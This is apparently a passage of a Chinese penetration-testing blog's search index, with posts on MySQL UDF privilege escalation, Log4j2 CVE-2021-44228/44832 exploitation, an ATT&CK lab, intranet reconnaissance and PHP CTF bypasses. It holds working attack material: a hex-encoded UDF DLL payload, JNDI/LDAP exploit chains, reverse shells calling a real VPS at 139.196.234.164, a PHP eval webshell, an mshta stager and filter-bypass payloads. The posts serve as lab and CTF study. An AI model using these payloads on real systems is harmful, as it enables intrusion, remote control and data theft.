02400008029000060290000b02400002010000060290000b02400003014000060290000b02400009016000060290000b0240000601b000060290000b0240000b01e000060290000b0240000a026000060290000b024000000000100020003000400050006000700080009000a000b000c000d000e000f0010001100120013001400150016001700180019001a001b001c001d005d990200699902007c9902008d99020099990200ac990200bd990200c3990200d0990200db990200e5990200f6990200059a02000e9a02001e9a02002c9a0200379a0200499a0200599a0200629a0200729a0200809a0200889a0200979a0200a49a0200ad9a0200bd9a0200cb9a0200d09a0200dc9a02004b696c6c50726f63657373004b696c6c50726f636573735f6465696e6974004b696c6c50726f636573735f696e69740050726f63657373566965770050726f63657373566965775f6465696e69740050726f63657373566965775f696e69740061626f75740061626f75745f6465696e69740061626f75745f696e6974006261636b7368656c6c006261636b7368656c6c5f6465696e6974006261636b7368656c6c5f696e697400636d647368656c6c00636d647368656c6c5f6465696e697400636d647368656c6c5f696e697400646f776e6c6f6164657200646f776e6c6f616465725f6465696e697400646f776e6c6f616465725f696e6974006f70656e33333839006f70656e333338395f6465696e6974006f70656e333338395f696e6974007265677265616400726567726561645f6465696e697400726567726561645f696e69740072656777726974650072656777726974655f6465696e69740072656777726974655f696e6974007368757400736875745f6465696e697400736875745f696e697400') into dumpfile 'C:\\\\phpstudy_pro\\\\Extensions\\\\MySQL5.7.26\\\\lib\\\\plugin\\\\moonudf.dll'; 创建函数 create function cmdshell returns string soname 'C:\\\\phpstudy_pro\\\\Extensions\\\\MySQL5.7.26\\\\lib\\\\plugin\\\\moonudf.dll'","link":"/2021/03/19/web-security/sql-security-tiquan/"},{"title":"Log4j2基于JDBCAPPENDER配置文件任意文件执行(CVE-2021-44832)","text":"前期log4j2存在的远程代码执行漏洞（CVE-2021-44228）引起了轩然大波。昨天上网冲浪发现，checkmark研究员YANIV NIZRY公布了新版本log4j2 2.17.0中存在基于JDBCAPPENDER配置文件的任意命令执行。且该漏洞已经公布其CVE编号为CVE-2021-44832。 漏洞描述log4j2在进行JDBC反序列化之前，可以通过JNDI动态远程获取数据库源文件。官方配置文档的格式如下： &lt;?xml version=\"1.0\" encoding=\"UTF-8\"?> &lt;Configuration status=\"error\"> &lt;Appenders> &lt;JDBC name=\"databaseAppender\" tableName=\"dbo.application_log\"> &lt;DataSource jndiName=\"java:/comp/env/jdbc/LoggingDataSource\" /> &lt;Column ... &lt;/JDBC> &lt;/Appenders> … &lt;/Configuration> 这里可以尝试控制任意LDAP的URL,而达成对应的利用。 &lt;DataSource jndiName=\"ldap://127.0.0.1:1389/Exploit\"/> 本地复现本地获取2.17.0版本log4j2 &lt;?xml version=\"1.0\" encoding=\"UTF-8\"?> &lt;project xmlns=\"http://maven.apache.org/POM/4.0.0\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd\"> &lt;modelVersion>4.0.0&lt;/modelVersion> &lt;groupId>org.example&lt;/groupId> &lt;artifactId>log4j-rce&lt;/artifactId>n &lt;version>1.0-SNAPSHOT&lt;/version> &lt;dependencies> &lt;!-- https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-core --> &lt;dependency> &lt;groupId>org.apache.logging.log4j&lt;/groupId> &lt;artifactId>log4j-core&lt;/artifactId> &lt;version>2.17.0&lt;/version> &lt;/dependency> &lt;!-- https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-api --> &lt;dependency> &lt;groupId>org.apache.logging.log4j&lt;/groupId> &lt;artifactId>log4j-api&lt;/artifactId> &lt;version>2.17.0&lt;/version> &lt;/dependency> &lt;!-- &lt;dependency>--> &lt;!-- &lt;groupId>commons-collections&lt;/groupId>--> &lt;!-- &lt;artifactId>commons-collections&lt;/artifactId>--> &lt;!-- &lt;version>3.1&lt;/version>--> &lt;!-- &lt;/dependency>--> &lt;/dependencies> &lt;/project> 这里直接借助CVE-2021-44228 poc来进行测试 import java.util.*; import org.apache.logging.log4j.LogManager; import org.apache.logging.log4j.Logger; public class Log4j2 { public static void main(String[] args) { System.setProperty(\"log4j2.configurationFile\",\"http://192.168.1.81:8000/config.xml\"); System.setProperty(\"com.sun.jndi.ldap.object.trustURLCodebase\",\"true\"); final Logger logger = LogManager.getLogger(Log4j2.class); Scanner sc = new Scanner(System.in); String str; while(true) { str = sc.nextLine(); logger.error(str); } } } 本地提供一个config.xml的配置文件 &lt;?xml version=\"1.0\" encoding=\"UTF-8\"?> &lt;Configuration status=\"error\"> &lt;Appenders> &lt;JDBC name=\"databaseAppender\" tableName=\"dbo.application_log\"> &lt;DataSource jndiName=\"dns://${env:COMPUTERNAME}.mya9m5.dnslog.cn/exp\" /> &lt;Column name=\"eventDate\" isEventTimestamp=\"true\" /> &lt;Column name=\"level\" pattern=\"%level\" /> &lt;Column name=\"logger\" pattern=\"%logger\" /> &lt;Column name=\"message\" pattern=\"%message\" /> &lt;Column name=\"exception\" pattern=\"%ex{full}\" /> &lt;/JDBC> &lt;/Appenders> &lt;Loggers> &lt;Root level=\"warn\"> &lt;AppenderRef ref=\"databaseAppender\"/> &lt;/Root> &lt;/Loggers> &lt;/Configuration> 运行后接收请求: 漏洞利用编写一个exp攻击，发起弹出计算机的命令，并且本地编译成恶意class类 import com.sun.org.apache.xpath.internal.objects.XString; public class exp { static { // System.out.print(\"正在执行命令\"); try { Runtime rt = Runtime.getRuntime(); // String[] commands = {\"bash -i >&amp; /dev/tcp/139.196.234.164/5555 0>&amp;1\"}; String[] commands = {\"Calc\"}; Process pc = rt.exec(commands); System.out.println(\"正在执行命令\"); pc.waitFor(); } catch (Exception e) { e.printStackTrace(); } } } 恶意exp类文件目录下开启简易http服务 python3 -m http.server 8001 恶意config.xml文件目录下开启简易http服务 python3 -m http.server 使用marshalsec启动恶意ldap服务 java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer \"http://192.168.1.81:8001/#exp\" 7788 修改config.xml文件DataSource为 &lt;DataSource jndiName=\"ldap://192.168.1.81:7788/exp\" /> 运行Log4j2.java触发恶意代码执行： 漏洞分析该漏洞利用之处比较鸡肋，你需要能够拥有修改本地config文件的权限才能达成对应的利用，因此其影响面相对较窄。但是出于安全考虑，还是建议将其更新至最新版本. 漏洞修复https://logging.apache.org/log4j/2.x/security.html 将 Apache Log4j2 升级到 2.17.1、2.12.4 和 2.3.2 或更高版本。 参考连接 https://checkmarx.com/blog/cve-2021-44832-apache-log4j-2-17-0-arbitrary-code-execution-via-jdbcappender-datasource-element/","link":"/2021/12/29/%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/Log4j2%E5%9F%BA%E4%BA%8EJDBCAPPENDER%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E6%89%A7%E8%A1%8C-CVE-2021-44832/"},{"title":"log4j2RCE(CVE-2021-44228)漏洞利用与分析","text":"漏洞描述:Apache Log4j2 是一款开源的 Java 日志记录工具，大量的业务框架都使用了该组件。如：Apache Struts2、Apache Solr、Apache Druid、Apache Flink等。此次漏洞是用于 Log4j2 提供的 lookup 功能造成的，该功能允许开发者通过一些协议去读取相应环境中的配置。但在实现的过程中，并未对输入进行严格的判断，从而造成漏洞的发生。 影响范围:Apache Log4j 2.x &lt; 2.15.0-rc2 漏洞复现本地复现编写本地exp类 import com.sun.org.apache.xpath.internal.objects.XString; public class exp { static { // System.out.print(\"正在执行命令\"); try { Runtime rt = Runtime.getRuntime(); // String[] commands = {\"bash\", \"-i\", \">&amp;\", \"/dev/tcp/139.196.234.164/5555 0>&amp;1\"}; String[] commands = {\"Calc\"}; Process pc = rt.exec(commands); System.out.println(\"正在执行命令\"); pc.waitFor(); } catch (Exception e) { e.printStackTrace(); } } } 本地编译为class文件 javac exp.java 使用marshalsec本地启用恶意监听服务 java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer \"http://192.168.1.81:8000/#exp\" 7788 使用Python3在恶意类文件路径下启动一个简易http服务 python3 -m http.server 插入恶意payload执行，触发命令执行 ${jndi:ldap://192.168.1.81:7788/exp} 线上靶机复现-shell反弹使用JNDI启动恶意服务 java -jar JNDIExploit-1.2-SNAPSHOT.jar -i \"x.x.x.x\" -p 6666 构造攻击payload: payload=${jndi:ldap://x.x.x.x:1389/TomcatBypass/Command/Base64/YmFzaCAtaSA%252BJiAvZGV2L3RjcC8xMzkuMTk2LjIzNC4xNjQvNTU1NSAwPiYx} 注：后面command需要经过一次base64编码，两次URL编码处理 command: bash -i &gt;&amp; /dev/tcp/x.x.x.x/5555 0&gt;&amp;1 线上靶机复现-回显输出使用vulfocus上的靶机测试 用Log4j2 jndi injection fuzz tool对主机进行模糊测试，找到传参点在header头 使用JNDI启动恶意服务 java -jar JNDIExploit-1.2-SNAPSHOT.jar -i \"x.x.x.x\" -p 6666 抓包修改header为攻击payload X-Api-Version: ${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//139.196.234.164:1389/TomcatBypass/TomcatEcho} cmd:ls 修复方案截止到目前，网上的修复方法大致是这些： 补丁链接: log4j-2.15.0-rc2 1.添加jvm启动参数-Dlog4j2.formatMsgNoLookups=true； 2.在应用classpath下添加log4j2.component.properties配置文件，文件内容为log4j2.formatMsgNoLookups=true； 3.JDK使用11.0.1、8u191、7u201、6u211及以上的高版本。","link":"/2021/12/11/%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/log4j2RCE-CVE-2021-44228/"},{"title":"ATT&amp;CK_01靶场学习","text":"环境配置靶场环境部署时，win7虚机需要进入系统手动开启一下phpstudy，且关闭防火墙。 综合渗透信息收集查看本机地址段，使用netdiscover发现同段存活主机 netdiscover -i eth0 -r 192.168.49.0/24 使用nmap扫描目前主机端口开放情况 nmap -T4 -A -v -sS 192.168.49.129 站点目录扫描 python3 dirsearch.py -u &quot;http://192.168.49.129/&quot; -e php 漏洞利用phpmyadmin写日志getshellweb访问发现直接是phpstudy探针,通过探针测试出mysql存在弱口令root/root 因为phpstudy存在phpmyadmin组件，直接利用phpmyadmin实现写webshell操作 select '&lt;?php @eval($_POST[&quot;cmd&quot;])?&gt;' into outfile 'C:/phpStudy/WWW/shell.php' 但是开启了写文件限制 但是这里可以尝试使用日志文件getshell 首先查看日志状态 show variables like '%general%'; 当开启general时，所执行的sql语句都会出现在stu1.log文件中。那么，如果修改generallogfile的值，那么所执行的sql语句就会对应生成对应的文件中，进而getshell。 SET GLOBAL general_log='on' set GLOBAL general_log_file='C:/phpStudy/WWW/shell.php' 再次执行含有shell的语句，请求发现写入成功 后台弱口令getshell 根据备份站点文件获取完整路径信息 http://192.168.49.129/yxcms/protected/apps/default/view/default/hack.php 存储型XSS前台注册用户留言板插入,后台审核通过即可触发。 在实际业务场景下，可以以次获取管理用户cookie，伪造登录 主机上线cs主机上线提权使用蚁剑成功连接shell 使用cs html上线主机，且是administrator权限。 mshta http://192.168.49.130:80/download/file.ext 使用cs内建提权码，成功提至管理员权限 主机信息收集shell ipconfig /all获取内网主机网段为192.168.29.0/24 域为 god.org 查看域信息 shell net group /domain 上传3389.bat脚本开启3389端口 使用远程桌面进行连接 上传frp代理实现socks5内网穿透","link":"/2021/10/27/%E7%BB%BC%E5%90%88%E6%B8%97%E9%80%8F/ATT-CK-01/"},{"title":"内网渗透信息收集","text":"内网渗透信息收集0x01 基本命令 获取主机名 hostname 查询所有计算名称 dsquery computer 查看配置及补丁信息 systeminfo wmic qfe get description,installedOn /format:csv 系统版本 ver 进程信息 tasklist /svc wmic process get caption,executablepath,commandline /format:csv get-process 查看所有环境变量 set 查看计划任务 schtasks /QUERY /fo LIST /v 查看安装驱动 DRIVERQUERY 操作系统信息 架构 wmic os get osarchitecture 系统名 wmic os get caption 查看逻辑盘 wmic logicaldisk get caption 查看安装的软件信息 wmic product get name,version 查看服务信息 wmic service list brief sc query 0x02 域信息","link":"/2021/08/14/%E7%BB%BC%E5%90%88%E6%B8%97%E9%80%8F/Network-infiltration-base/"},{"title":"第三期cfs靶场练习","text":"payload=${jndi:ldap://4o5zj6.dnslog.cn/cxvahp} vps：139.196.234.164 bash -i >&amp; /dev/tcp/139.196.234.164/5555 0>&amp;1 Apache log4j2漏洞(CVE-2021-44228)10.134.110.23:8080 flag1: flag{ee5645e88bd351505554be5016ef505e}第一步： payload=${jndi:ldap://139.196.234.164:1389/TomcatBypass/Command/Base64/YmFzaCAtaSA%252BJiAvZGV2L3RjcC8xMzkuMTk2LjIzNC4xNjQvNTU1NSAwPiYx} 注：后面command需要经过一次base64编码，两次URL编码处理 command: bash -i &gt;&amp; /dev/tcp/139.196.234.164/5555 0&gt;&amp;1 第二步： vps监听 nc -lvvp 5555 开启恶意ldap服务 java -jar JNDIExploit-1.2-SNAPSHOT.jar -i &quot;139.196.234.164&quot; -p 8080 成功上线 10.134.110.23 内网探测 root@66f6d6f3234c:/tmp# ./fscan_amd64 -h 10.134.0.0/16 ./fscan_amd64 -h 10.134.0.0/16 ___ _ / _ \\ ___ ___ _ __ __ _ ___| | __ / /_\\/____/ __|/ __| '__/ _` |/ __| |/ / / /_\\\\_____\\__ \\ (__| | | (_| | (__| &lt; \\____/ |___/\\___|_| \\__,_|\\___|_|\\_\\ fscan version: 1.6.3 start infoscan (icmp) Target '10.134.110.23' is alive (icmp) Target '10.134.110.1' is alive (icmp) Target '10.134.110.26' is alive (icmp) Target '10.134.110.34' is alive icmp alive hosts len is: 4 10.134.110.34:8093 open 10.134.110.1:22 open 10.134.110.34:8083 open 10.134.110.34:8080 open 10.134.110.26:8080 open 10.134.110.1:8080 open 10.134.110.23:8080 open 10.134.110.34:8009 open 10.134.110.26:8009 open alive ports len is: 9 start vulscan [*] WebTitle:http://10.134.110.34:8080 code:200 len:1507 title:Welcome to JBos s&amp;trade; [*] WebTitle:http://10.134.110.23:8080 code:404 len:0 title:None [*] WebTitle:http://10.134.110.1:8080 code:404 len:0 title:None [+] InfoScan:http://10.134.110.23:8080 [SprintBoot] [*] WebTitle:http://10.134.110.26:8080 code:200 len:20 title:Apache Tomcat/8 .0.43 [+] InfoScan:http://10.134.110.34:8080 [Jboss JBOSS] [*] WebTitle:http://10.134.110.34:8083 code:400 len:0 title:None [+] InfoScan:http://10.134.110.1:8080 [SprintBoot] [+] http://10.134.110.26:8080/manager/html tomcat tomcat [+] http://10.134.110.26:8080 poc-yaml-tomcat-manager-week 已完成 8/9 [-] ssh 10.134.110.1:22 root 123456789 ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain 已完成 8/9 [-] ssh 10.134.110.1:22 admin admin123 ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain 已完成 8/9 [-] ssh 10.134.110.1:22 admin 123321 ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain 已完成 9/9 scan end 部署frp内网穿透工具 使用wget上传文件至外网机 wget http://139.196.234.164:8000/frpc wget http://139.196.234.164:8000/frpc.ini frp连接 server:./frps -c frps.ini client:./frpc -c frpc.ini 10.134.110.26:8080 存在toamcat弱口令部署war包 上传蚁剑马 flag3： flag{a457f1dd3623a399d78a9672d225ddd5} 10.134.110.34:8080 JBOSS 命令执行 flag4：flag{4b0e8838ced75dbb359414892942d19d} 172.78.69.16 172.78.69.15:8080 存在shire反序列化漏洞 flag2: flag{b2a0b3a262c1234132672229af281ed6}","link":"/2021/12/07/%E7%BB%BC%E5%90%88%E6%B8%97%E9%80%8F/xiyu-new-bachang-cfs/"},{"title":"内网渗透之代理转发","text":"在日常渗透测试过程中，当我们getshell一台边界主机后，经常需要借助边界主机实现对内网主机流量的转发和代理操作。这里可以使用一些代理脚本和转发工具将内网的流量代理和转发到本地进行访问，以方便我们后续内网渗透。这边着重介绍一下在内网渗透中常用的几种转发协议的特点和代理工具的使用。 代理的分类正向代理代理服务器位于客户端和服务端之间的一台服务器，且proxy和client同属于一个区域，对server是透明的；其作用是从目标服务器取得内容，客户端向代理服务器发送一个请求并指定目标，然后代理服务器向目标服务器转交请求并将获得的内容返回给客户端。（类似于现实生活中的中介） 运行流程：客户端——请求——&gt; 代理服服务器——请求——&gt; 服务端 代理特点： 客户端无法直接访问到服务端的目标应用，但是代理服务器可以。（典型场景：FANQIANG） 代理服务器帮助客户端请求页面并缓存在本地，并将页面返回到客户端 客户端需要设置代理服务器地址和端口（插件化），客户端知道代理服务器的存在 本质上代理服务器代理了客户端去和服务端请求交互的任务 反向代理以代理服务器来接收网络连接请求，然后将请求转发给内部网络上的服务器，并将服务器上得到的结果返回给网络上请求连接的客户端。代理服务器和服务端共处于一个区域中，对客户端是透明的。 代理特点： 客户端不清楚服务端是否存在代理服务器，以为请求的代理服务器就是真正的服务端 代理服务器将服务端页面缓存到本地，当客户端请求时直接返回给客户端 客户端无需任何配置，且不知道真实服务端的存在 应用场景：隐藏服务端真实IP、负载均衡、提高访问速度、增强安全性 代理工具lcx","link":"/2021/12/28/%E7%BB%BC%E5%90%88%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E4%BB%A3%E7%90%86%E8%BD%AC%E5%8F%91/"},{"title":"thinkphp5文件包含漏洞分析","text":"thinkphp5文件包含漏洞的源码审计与分析 文件包含漏洞环境复现直接官网下载对应版本的源码包，使用docker部署即可。 使用已有开源环境复现： （1）执行命令 docker pull p0ison/thinkphp:5.0.18 （2）执行命令 docker run -itd -p 80:80 p0ison/thinkphp:5.0.18 （3）访问地址 ：http://xx.xx.xx.xx/tp/public 版本影响: 5.0.0&lt;=ThinkPHP5&lt;=5.0.18 、5.1.0&lt;=ThinkPHP&lt;=5.1.10 漏洞利用启动环境，请求http://x.x.x.x/public/ tp5自带的公共模块 修改application/index/controller/Index.php内容如下: &lt;?php namespace app\\index\\controller; use \\think\\Controller; class Index extends Controller { public function index() { $this->assign($this->request->get()); echo \"this is test tp5 readfile vul\"; return $this->fetch(\"index\"); //当前的模块/view目录/当前控制器/当前操作 这里我定义了一个index模块 } } 在application/index/目录下新增view文件夹; 在view文件夹下新增与模块名同名的文件夹index; 在index文件夹下新建文件index.html,内容随意即可; 最后请求http://x.x.x.x/public/index.php/index/index/index?cacheFile=/etc/passwd，成功读取文件 漏洞分析首先我们新建的类方法中调用模板渲染函数的assign,跟进函数assgin的源码，直接进入\\thinkphp\\library\\think\\Controller.php 发现调用view类中的assgin方法，跟进代码，进入\\thinkphp\\library\\think\\view.php 分析源码发现这里对模板变量值进行了赋值，并且存入到了数组中； 这里基本没什么问题。赋值完成后，会去调用fetch方法加载模板输出，这里如果没有指定模板名称，就会使用默认的文件作为模板当前模块/默认视图目录/当前控制器（小写）/当前操作（小写）.html进行渲染，如果没有默认文件程序就回报错。继续跟进fetch方式，进入\\thinkphp\\library\\think\\Controller.php 发现直接调用view类中fetch，直接跟进代码，进入\\thinkphp\\library\\think\\view.php 继续跟进代码内容进入\\think\\view\\driver\\Think.php 发现代码继续调用template类的fetch方法，跟进代码 我们发现在这里变量$vars直接赋值给$this-&gt;data,并且直接被带入到template类中文件引擎调用read方法，跟进read方法，\\think\\template\\driver\\File.php 卧槽，这里的read方法竟然对$vars调用了extract的函数，这样就可以直接覆盖cacheFile变量了，因为这里的$vars变量是可以用户控制的；最终达成了利用。 整体利用链","link":"/2019/03/07/web-security/php-code-audit/php-audit-thinkphp5-readfile/"},{"title":"bypass_exit","text":"bypass_exit题目源码&lt;?php $a = '&lt;?php exit(0);?>'; $a .= @$_POST['c']; $file = @$_POST['file']; if (isset($file)){ file_put_contents($file, $a); }else{ show_source(__FILE__); // flag in flag.php } ?> 代码分析首先将代码&lt;?php exit(0);?&gt;赋值给变量$a; 通过POST方式接受变量c的内容拼接变变量$a中,这样不论如何，写入的shell都无法被正常利用; 这里使用base64-decode的方式对其进行绕过,因为base64在解码时，会对&lt;、?、;、&gt;这些特殊字符进行忽略，那么原本的第一行代码就变成了phpexit; 漏洞利用payload:c=PD9waHAgQGV2YWwoJF9QT1NUW2NtZF0pOz8+&amp;file=php://filter/write=convert.base64-decode/resource=shell.php 成功写入shell:cmd=system(‘cat flag.php’);","link":"/2018/07/04/web-security/php-code-audit/php-code-audit-bypass-exit/"},{"title":"74cm模板注入任意文件读取漏洞分析","text":"74cmsssti 文件包含漏洞的源码审计分析流程 74cmsssti+文件包含漏洞环境复现直接官网下载对应版本的源码包，使用docker部署即可。 docker run –name 74cms -itd -P 74cmsssti_readfile:latest 版本影响：74cms &lt; 6.0.48 漏洞利用启动docker，进行站点安装，数据库：ctf ctf ； 后台admin admin； 安装完成后请求，发送如下请求： http://x.x.x.x/index.php?m=home&amp;a=assign_resume_tpl POST:variable=1&amp;tpl=/r/n&lt;qscms/company_show 列表名=”info” 企业id=”$_GET[;id;]”/&gt; 触发报错，进入容器发现日志记录功能已经记录报错日志，位置在:/data/Runtime/Logs/Home 我们看到构造的payload内容也被成功写入进日志，并且日志的命令格式为:年_月_日.log 尝试包含日志,成功利用 http://x.x.x.x/index.php?m=home&amp;a=assign_resume_tpl POST:variable=1&amp;tpl=data/Runtime/Logs/Home/21_01_06.log 漏洞分析根据官方公告说明在/Application/Common/Controller/BaseController.class.php文件的assign_resume_tpl函数因为过滤不严格，导致了模板注入，可以进行远程命令执行。 骑士cms采用的是thinkphp3.2.3版本的框架，该框架标准的url路径为： http://x.x.x.x/index.php/模块/控制器/操作 但是骑士cms采用的是普通模式，即使用传统的GET传参方式来指定当前的访问的模块和操作，可以通过/thinkphp/Conf/convention.php查看设置： 可以发现，使用m获取模块，c获取控制器，a获取操作：?m=&amp;c=&amp;a=&amp;var1=&amp;var2= 清楚最基本的传参格式后，我们来看整个漏洞的利用过程。 跟进/Application/Common/Controller/BaseController.class.php中的assign_resume_tpl方法： 此处传入两个变量，其中变量$tpl传入到fetch方法，跟进该方法,进入/ThinkPHP/Library/Think/View.class.php: 首先判断模板文件是否为空，如果不为空，继续判断是否使用了原生模板，查看配置文件/ThinkPHP/Conf/convention.php： 通过配置文件发现骑士cms启用的是Think模板引擎，因此判断进入else: 这里将值带入数组，并传入Hook::listen 并解析view_parse标签，跟进/ThinkPHP/Library/Think/Hook.class.php方法： 通过代码我们可以发现，Hook::listen()方法，该方法会查找$tags是否绑定view_parse方法，然后foreach遍历$tags属性，并执行Hook::exec方法，跟进该方法： 通过代码我们发现exec方法会检查行为名称，如果含有Behavior关键字，入口方法必须是run方法;这里run方法用的所有参数是在Hook::listen时传递的。 此时我们去寻找Hook的配置文件，在/ThinkPHP/Mode/common.php中 从配置文件可以看到view_parase标签执行了ParseTemplateBehavior这个类，因为这边已经定义所有的行为执行入口均为run方法，所以这边直接分析run方法即可；跟进这个类/ThinkPHP/Library/Behavior/ParseTemplateBehavior.class.php： 阅读以上代码发现第一次解析时，是没有缓存文件的，所以会调用template执行fetch方法: 跟进文件/ThinkPHP/Library/Think/Template.class.php 这里我们看到fetch方法调用了loadTemplate方法，这里跟进该方法： 我们发现变量$templateFile被赋值给了$tmplContent,然后该变量在编译模板内容时赋值了方法compiler()方法，跟进该方法： 分析该段代码我们发现，这里传入的模板内容未经过任何过滤就拼接到了$tmplContent变量中 然后回归到loadTemplate方法,跟踪到下面，看到有编译模板内容的逻辑代码如下： 这里我们看到的是对模板进行缓存处理，然后返回模板的缓存文件名 继续回归到此前fetch方法: 我们发现返回的缓存文件名进入到Storage::load的方法,跟进该方法： 看到上面代码就明了了，直接先进行一个非空判断，不为空的情况下直接包含了该文件。 整体利用链","link":"/2021/01/05/web-security/php-code-audit/php-audit-74cmsssti-readfile/"},{"title":"Baby PHP(hacklu CTF 2018)","text":"记录一道典型CTF源码审计题的解题过程 Baby PHP(hacklu CTF 2018)题目源码&lt;?php require_once('flag.php'); error_reporting(0); if(!isset($_GET['msg'])){ highlight_file(__FILE__); die(); } @$msg = $_GET['msg']; if(@file_get_contents($msg)!==\"Hello Challenge!\"){ die('Wow so rude!!!!1'); } echo \"Hello Hacker! Have a look around.\\n\"; @$k1=$_GET['key1']; @$k2=$_GET['key2']; $cc = 1337;$bb = 42; if(intval($k1) !== $cc || $k1 === $cc){ die(\"lol no\\n\"); } if(strlen($k2) == $bb){ if(preg_match('/^\\d+＄/', $k2) &amp;&amp; !is_numeric($k2)){ if($k2 == $cc){ @$cc = $_GET['cc']; } } } list($k1,$k2) = [$k2, $k1]; if(substr($cc, $bb) === sha1($cc)){ foreach ($_GET as $lel => $hack){ $$lel = $hack; } } $‮b = \"2\";$a=\"‮b\";//;1=b if($$a !== $k1){ die(\"lel no\\n\"); } // plz die now assert_options(ASSERT_BAIL, 1); assert(\"$bb == $cc\"); echo \"Good Job ;)\"; // TODO // echo $flag; 代码分析part 1 @$msg = $_GET['msg']; if(@file_get_contents($msg)!==\"Hello Challenge!\"){ die('Wow so rude!!!!1'); } 1、通过get获取变量$msg内容，经过一个判断带入到函数file_get_contents()中，使得结果为”Hello Challenge!”。这里有两种绕过方式： msg=data://plain/text,Hello Challenge! msg=php://input post:Hello Challenge! part 2 @$k1=$_GET['key1']; @$k2=$_GET['key2']; $cc = 1337;$bb = 42; if(intval($k1) !== $cc || $k1 === $cc){ die(\"lol no\\n\"); } 2、通过get获取变量$k1,$k2。判断变量$k1的整数值与$cc不相等；并且$k1要恒等于$cc（恒等于就是变量类型也要一致）。这边我们可以知道$k1是通过key1获取得到，所以k1永远是字符串类型，所以$k1===$cc永远为false;所以只能使$k1=1337; part 3 if(strlen($k2) == $bb){ if(preg_match('/^\\d+＄/', $k2) &amp;&amp; !is_numeric($k2)){ if($k2 == $cc){ @$cc = $_GET['cc']; } } } 3、判断变量k2的长度是否等于$bb,也就是42位;第二个if通过正则判断变量$k2是否为纯数字加上＄结尾，此处的符号和我们平时见过的$符号不一样，这个是unicode编码的$符号；条件!is_numeric($k2)默认是恒成立的；要使第三个if成立,则可以使k2中含有数字1337；为了满足长度为42位我们可以使用0进行填充占位;特殊字符＄可以对其进行url编码得到%EF%BC%84，该字符占三位长度;则最终k2=000000000000000000000000000000000001337%EF%BC%84 part 4 list($k1,$k2) = [$k2, $k1]; if(substr($cc, $bb) === sha1($cc)){ foreach ($_GET as $lel => $hack){ $$lel = $hack; } } 4、首先对变量k1，k2进行列表位置调换；变量$cc重新通过get方式获取；传递数组进入函数substr()和sha1()中，两函数返回的结果都为null，使得条件成立。 part 5 $‮b = \"2\";$a=\"‮b\";//;1=b if($$a !== $k1){ die(\"lel no\\n\"); } 5、我们看第一行代码有些特殊，这行代码因为在字符串前插入了\\u202e，那么后续的字符就会反转。放入编辑器后，就可以看出正确的代码格式为$b=&quot;2&quot;;$a=&quot;b&quot;;//1=b。判断中$$a == $($a) == $b == 2 ;这里只要使得$k1=2即可。回到part4判断成立的循环中，foreach通过get获取参数的覆盖掉全局变量，那这个很好办了，直接传入k1=2即可pass。 part 6 assert_options(ASSERT_BAIL, 1); assert(\"$bb == $cc\"); 6、assert可以调用函数，并且前面我们知道foreach可以全局变量覆盖，那么我们只要构造出assert(var_dump($flag);)即可；里面$bb=$cc,那么传入cc=var_dump($flag);//即可完成 漏洞利用payload:192.168.1.191:32768/?msg=data://plain/text,Hello Challenge!&amp;key1=1337&amp;key2=000000000000000000000000000000000001337%EF%BC%84&amp;cc[]=&amp;k1=2&amp;bb=var_dump($flag);//","link":"/2018/12/30/web-security/php-code-audit/ctf-babyctf-hacklu2018/"},{"title":"bypass_strpos","text":"bypass_strpos题目源码&lt;?php include 'flag.php'; header('referer:$_GET[\\'100fc9da60f9ae9d6488451decdc0742\\']'); if(isset($_GET['52384'])) { show_source(__FILE__); } else if(isset($_GET['a'])) { if(md5($_GET['a']) == md5('s155964671a') &amp;&amp; substr($_GET['a'],-1) == 8) { if(preg_match(\"/goodjob/\", $_GET['b']) === FALSE &amp;&amp; strpos ($_GET['b'], 'goodjob') !== FALSE) { $text = @$_REQUEST['d']; @eval(\"var_dump($text);\"); } else die('no,no,no'); } else die('no,no,no'); } else echo 'welcome'; ?> 代码分析首先通过GET传参接收一个md5的加密值； 抓包后在,在响应头信息中可以发现referer:$_GET['100fc9da60f9ae9d6488451decdc0742']’; 炸眼一看,确定是一串加密值，首先对这个进行get传参，发现没有，说明不是直接传入md5加密值。尝试对该md5值进行明文爆破，得到其明文为52384,get传入该值直接获取源码; 分析源码第一个判断是变量a的md5值与给定明文的md5值相等，并且要保证其值的最后一位为8；那么直接md5碰撞呗，找到其值为240610708； 第二个判断是参数b经过strpos函数，strpos函数是用户字符串查找的;这里可以直接用空数组绕过,即b[]=; 最后传入变量d经过eval函数,变量在var_dump函数中，直接传入$flag; 漏洞利用payload:?a=240610708&amp;b[]=&amp;d=$flag","link":"/2018/07/04/web-security/php-code-audit/php-code-audit-bypass-strpos/"},{"title":"eval(2020NSSC)","text":"eval(2020NSSC)题目源码&lt;?php error_reporting(0); //flag is located in flag.php if( isset($_GET['a']) ){ $a = $_GET['a']; if( strlen($a)>27 ){ die(strval(strlen($a)) . \" Long.\"); } if( preg_match(\"/[A-Zb-z0-9_$.&amp;;|^~![\\](){}\\$@\\*]+/\", $a) ){ die(\"NO.\"); } eval(\"echo '\" . $a .\"';\"); } else { show_source(__FILE__); } ?> 代码分析分析正则匹配发现字母a未过滤,特殊字符?未过滤;菊花一紧，想到铁铁的通配符绕过啊; 在当前目录下有flag.php 所以构造/bin/cat flag.php 即可读取文件内容 对于eval当中的拼接符号. 可以使用，绕过；并且利用反引号执行命令; 漏洞利用payload:?a=',\\/???/?a?%20??a?????`,’`","link":"/2020/12/04/web-security/php-code-audit/php-code-audit-eval-2020NSSC/"},{"title":"eval_xor","text":"eval_xor题目源码&lt;?php function getPos() { @include 'find.php'; echo $findflag; } ?> &lt;?php session_start(); if 